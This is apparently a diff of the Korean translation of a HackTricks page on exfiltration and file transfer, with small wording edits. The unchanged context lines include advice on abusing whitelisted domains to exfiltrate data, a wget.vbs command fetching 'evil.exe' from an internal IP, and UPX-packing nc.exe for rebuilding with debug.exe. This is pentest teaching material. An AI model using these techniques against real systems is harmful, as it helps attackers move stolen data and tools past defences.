@@ -15,13 +15,13 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-## Commonly whitelisted domains to exfiltrate information
+## 일반적으로 화이트리스트에 등록된 도메인으로 정보를 유출하기
 
-Check [https://lots-project.com/](https://lots-project.com/) to find commonly whitelisted domains that can be abused
+악용할 수 있는 일반적으로 화이트리스트에 등록된 도메인을 찾으려면 [https://lots-project.com/](https://lots-project.com/)를 확인하세요.
 
 ## Copy\&Paste Base64
 
-**리눅스**
+**Linux**
 ```bash
 base64 -w0 <file> #Encode file
 base64 -d file #Decode file
@@ -58,7 +58,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### 파일 업로드
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**GET 및 POST(헤더 포함) 출력하는 SimpleHttpServer**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* [**GET 및 POST (헤더 포함) 출력하는 SimpleHttpServer**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 * Python 모듈 [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -247,7 +247,7 @@ sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-기본적으로 XP와 2003에서는 (다른 버전에서는 설치 중에 명시적으로 추가해야 함)
+기본적으로 XP와 2003에서는 (다른 경우에는 설치 중에 명시적으로 추가해야 함)
 
 Kali에서, **TFTP 서버 시작**:
 ```bash
@@ -309,7 +309,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` 프로그램은 이진 파일을 검사할 수 있을 뿐만 아니라 **16진수에서 이진 파일을 재구성할 수 있는 기능**도 가지고 있습니다. 이는 이진 파일의 16진수를 제공함으로써 `debug.exe`가 이진 파일을 생성할 수 있음을 의미합니다. 그러나 `debug.exe`는 **최대 64kb 크기의 파일을 조립하는 데 제한이 있다는 점**에 유의해야 합니다.
+`debug.exe` 프로그램은 이진 파일을 검사할 수 있을 뿐만 아니라 **16진수에서 이진 파일을 재구성할 수 있는 기능**도 가지고 있습니다. 이는 이진 파일의 16진수를 제공함으로써 `debug.exe`가 이진 파일을 생성할 수 있음을 의미합니다. 그러나 debug.exe는 **최대 64kb 크기의 파일을 조립하는 데 제한이 있다는 점**에 유의해야 합니다.
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -333,7 +333,7 @@ GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt=
 
 * [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
 * **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
-* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
 
 </details>
 {% endhint %}
